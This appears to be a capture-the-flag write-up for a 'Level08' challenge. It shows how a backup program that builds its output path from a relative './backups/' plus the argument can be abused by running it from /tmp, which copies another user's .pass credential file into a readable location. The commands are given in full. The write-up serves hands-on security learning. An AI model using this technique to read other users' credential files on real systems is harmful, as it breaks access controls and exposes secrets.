# Level08

We have a program that creates a backup of the file we pass it as an argument in the ./backup folder. We have permissions to read this backup.

The aim is to pass it the path to level09's .pass as an argument, in order to read its contents, but we've run into a problem:

```c
$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```
Here, we understand that the program simply concatenates two strings: "./backup" + argument. And the backup folder does not contain the /home/users folders...

To fix this, we'd have to create them in the backup folder, but we don't have the permissions...
```sh
$ mkdir -p ./backups/home/users/level09
mkdir: cannot create directory `./backups/home': Permission denied
```
Unfortunately, the backup folder is always accessed via a relative path which depends on the directory in which the program is run.

All you have to do is move to /tmp/ to create your own folder structure.

```sh
$ cd /tmp/
$ mkdir -p backups/home/users/level09
$ ~/level08 /home/users/level09/.pass
$ cat backups/home/users/level09/.pass
```